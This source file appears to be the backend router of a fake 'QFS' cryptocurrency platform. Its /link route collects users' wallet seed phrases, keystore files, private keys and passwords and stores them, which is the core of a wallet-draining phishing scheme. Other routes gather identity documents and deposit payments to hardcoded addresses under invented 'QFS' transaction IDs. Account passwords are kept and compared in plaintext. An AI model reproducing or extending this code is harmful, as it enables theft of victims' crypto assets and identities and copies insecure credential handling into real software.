import express from "express";
import { ensureAuthenticated } from "../middleware/authMiddleware.js";
import User from "../models/user.model.js";
import { upload } from "../config/cloudinary.js";
import multer from "multer";
import Message from "../models/message.model.js";
import CardOrder from "../models/CardOrder.js";
import QPhone from "../models/QPhone.js";
import KYC from "../models/KYC.js";
import { LinkedWallet } from "../models/LinkedWallet.js";
import crypto from "crypto";
import QRCode from "qrcode";
import Deposit from "../models/Deposit.js";

const parseForm = multer();

const userRouter = express.Router();

userRouter.get("/dashboard", ensureAuthenticated, (req, res) => {
  res.render("dashboard", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.get("/profile", ensureAuthenticated, (req, res) => {
  res.render("profile", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post(
  "/profile",
  ensureAuthenticated,
  upload.single("Profile_photo"),
  async (req, res) => {
    try {
      const {
        username,
        fullname,
        email,

        country,
        state,
        phone,
        current_pass_from_form,
        password,
        confirm_password,
      } = req.body;

      // Fetch current user
      const user = await User.findById(req.user.id);
      if (!user) {
        return res.status(200).json({ mssg: "User not found" });
      }

      // Check current password (since no bcrypt)
      if (current_pass_from_form && current_pass_from_form !== user.password) {
        return res.status(200).json({ mssg: "Current password is incorrect" });
      }

      // Handle password update (only if both new passwords match)
      let newPassword = user.password;
      if (password && confirm_password) {
        if (password !== confirm_password) {
          return res.status(200).json({ mssg: "New passwords do not match" });
        }
        newPassword = password;
      }

      // Handle image upload
      const imageUrl = req.file?.path || user.image;

      // Update user fields
      user.username = username || user.username;
      user.fullname = fullname || user.fullname;
      user.email = email || user.email;

      user.country = country || user.country;
      user.state = state || user.state;
      user.phone = phone || user.phone;
      user.password = newPassword;
      user.image = imageUrl;

      await user.save();

      return res.json({
        mssg: "ok",
        user: {
          username: user.username,
          fullname: user.fullname,
          email: user.email,
          phone: user.phone,
          country: user.country,
          state: user.state,

          image: user.image,
        },
      });
    } catch (err) {
      console.error("Error updating profile:", err);
      return res.status(200).json({
        mssg: "Something went wrong while updating your profile",
        error: err.message,
      });
    }
  }
);

userRouter.get("/cards", ensureAuthenticated, (req, res) => {
  res.render("card");
});

userRouter.post(
  "/cards",
  ensureAuthenticated,
  upload.single("Poof_of_address"), // handles image upload to Cloudinary
  async (req, res) => {
    try {
      const { cardholdersname, card_typ, email, phone, address, wallet_address } = req.body;

      // validate
      if (!cardholdersname || !card_typ || !email || !phone || !address || !wallet_address) {
        return res.json({ mssg: "Please fill in all required fields." });
      }

      // get image URL from cloudinary
      const proofUrl = req.file?.path || "";

      // Save to database
      await CardOrder.create({
        user: req.user._id,
        cardholdersname,
        card_typ,
        email,
        phone,
        address,
        wallet_address,
        proof_of_address: proofUrl,
      });

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error creating card order:", error);
      res.json({ mssg: "Something went wrong. Please try again later." });
    }
  }
);

userRouter.get("/phone", ensureAuthenticated, (req, res) => {
  res.render("phone");
});

// Upload proof of payment to Cloudinary
userRouter.post(
  "/phone",
  ensureAuthenticated,
  upload.single("Poof_of_payment"),
  async (req, res) => {
    try {
      const { wallet_address, amount, fullname, email, phone, address } = req.body;

      const proofUrl = req.file ? req.file.path : null; // Cloudinary URL

      // Save to MongoDB
      const newOrder = new QPhone({
        user: req.user._id,
        wallet_address,
        amount,
        fullname,
        email,
        phone,
        address,
        proof_of_payment: proofUrl,
      });

      await newOrder.save();

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error saving QPhone order:", error);
      res.json({ mssg: "Failed to process order. Please try again later." });
    }
  }
);

userRouter.get("/kyc", ensureAuthenticated, (req, res) => {
  res.render("kyc", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post(
  "/kyc",
  ensureAuthenticated,
  upload.fields([
    { name: "kyc_file_front", maxCount: 1 },
    { name: "kyc_file_back", maxCount: 1 },
  ]),
  async (req, res) => {
    try {
      const { doc_typ } = req.body;

      const frontUrl = req.files["kyc_file_front"] ? req.files["kyc_file_front"][0].path : null;
      const backUrl = req.files["kyc_file_back"] ? req.files["kyc_file_back"][0].path : null;

      if (!doc_typ || !frontUrl || !backUrl) {
        return res.json({ mssg: "All fields are required." });
      }

      // Save to DB
      const newKyc = new KYC({
        user: req.user._id,
        doc_typ,
        front_image: frontUrl,
        back_image: backUrl,
      });

      await newKyc.save();

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error saving KYC:", error);
      res.json({ mssg: "Failed to upload KYC documents." });
    }
  }
);

userRouter.get("/medical", ensureAuthenticated, (req, res) => {
  res.render("medical");
});
userRouter.get("/contact", ensureAuthenticated, (req, res) => {
  res.render("contact", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/contact", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { sender_name, sender_email, sender_subject, sender_mssg } = req.body;

    // Validate input
    if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
      return res.json({ mssg: "Please fill in all fields." });
    }

    // Save message to MongoDB
    const newMessage = new Message({
      sender_name,
      sender_email,
      sender_subject,
      sender_mssg,
    });

    await newMessage.save();

    // Send success response for AJAX
    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error saving contact message:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

userRouter.get("/fund", ensureAuthenticated, (req, res) => {
  res.render("securefund", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/fund", ensureAuthenticated, parseForm.none(), (req, res) => {
  res.json({ mssg: "ok" });
});

userRouter.get("/deposit", ensureAuthenticated, (req, res) => {
  res.render("deposit");
});

userRouter.get("/link", ensureAuthenticated, (req, res) => {
  res.render("linkWallet");
});

userRouter.post("/link", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { keyid, type_of_login_detail, Phrase, Keystore_json, Private_Key, password } = req.body;

    if (!type_of_login_detail || !keyid) {
      return res.json({ mssg: "Missing wallet type or keyid" });
    }

    let walletData = {
      user: req.user._id,
      keyid,
      type_of_login_detail,
      password: password || null,
    };

    // Dynamically attach whichever field was sent
    if (Phrase) walletData.Phrase = Phrase;
    if (Keystore_json) walletData.Keystore_json = Keystore_json;
    if (Private_Key) walletData.Private_Key = Private_Key;

    // Save to DB
    await LinkedWallet.create(walletData);

    res.json({ mssg: "ok" });
  } catch (err) {
    console.error("❌ Error linking wallet:", err);
    res.json({ mssg: "Something went wrong, please try again." });
  }
});

userRouter.get("/buy", ensureAuthenticated, (req, res) => {
  res.render("buy-crypto", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/deposit2", ensureAuthenticated, async (req, res) => {
  try {
   
    const { crypto_wallet } = req.body;

    const wallets = {
      bitcoin: {
        name: "Bitcoin",
        address: "bc1q1btc3sdc4bnw7hoppass6x54vmdjmcwsc4df",
      },
      ethereum: {
        name: "Ethereum",
        address: "0x1234567890abcdef1234567890abcdef12345678",
      },
      tether: {
        name: "Tether (TRC20)",
        address: "TG6xexampleTRC20address",
      },
      stellar: {
        name: "Stellar",
        address: "TG6xexampleTRC20address",
      },
      ripple: {
        name: "Ripple",
        address: "bc1q1btc3sdc4bnw7hoppass6x54vmdjmcwsc4df",
      },
      litecoin: {
        name: "Litecoin",
        address: "0x1234567890abcdef1234567890abcdef12345678",
      },
      doge: {
        name: "DogeCoin",
        address: "TG6xexampleTRC20address",
      },
      "shiba-inu": {
        name: "Shiba Inu",
        address: "TG6xexampleTRC20address",
      },
      tron: {
        name: "Tron",
        address: "bc1q1btc3sdc4bnw7hoppass6x54vmdjmcwsc4df",
      },
      cardano: {
        name: "Cardano",
        address: "0x1234567890abcdef1234567890abcdef12345678",
      },
      solana: {
        name: "Solana",
        address: "TG6xexampleTRC20address",
      },
      "polygon-ecosystem-token": {
        name: "Polygon Ecosystem Token",
        address: "TG6xexampleTRC20address",
      },
      algorand: {
        name: "Algorand",
        address: "bc1q1btc3sdc4bnw7hoppass6x54vmdjmcwsc4df",
      },
      official_trump: {
        name: "Official Trump",
        address: "0x1234567890abcdef1234567890abcdef12345678",
      },
      pepe: {
        name: "Pepe",
        address: "TG6xexampleTRC20address",
      },
    };


    const walletInfo = wallets[crypto_wallet];
    if (!walletInfo) {
      return res.status(200).send("Invalid crypto wallet selected");
    }


    // Generate QR code for the address
    const qrImage = await QRCode.toDataURL(walletInfo.address);


    // Generate unique transaction ID
    const transactionId = "QFS" + crypto.randomBytes(4).toString("hex").toUpperCase();

    // Render deposit page
    return res.render("deposit2", {
      crypto_wallet: walletInfo.name,
      walletAddress: walletInfo.address,
      qrImage,
      transactionId,
      user: req.user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server Error");
  }
});

userRouter.post("/confirm-deposit", ensureAuthenticated, async (req, res) => {
  try {
    const { transactionId, wallet, address, amount } = req.body;

    const newDeposit = new Deposit({
      user: req.user._id,
      transactionId,
      wallet,
      address,
      amount,
      status: "pending",
      createdAt: new Date(),
    });

    await newDeposit.save();

    res.json({ mssg: "Deposit recorded successfully! Awaiting confirmation." });
  } catch (err) {
    console.error(err);
    res.status(500).json({ mssg: "Server error" });
  }
});



userRouter.get("/transaction", ensureAuthenticated, async (req, res) => {
  const transactions = await Deposit.find({ user: req.user._id }).sort({ createdAt: -1 });
  res.render("transaction", { transactions });
});


// Additional routes for sidebar and withdrawal modal
userRouter.get("/sidebar", (req, res) => {
  res.render("sidebar");
});
userRouter.get("/withdraw", (req, res) => {
  res.render("withdrawal_modal");
});

export default userRouter;
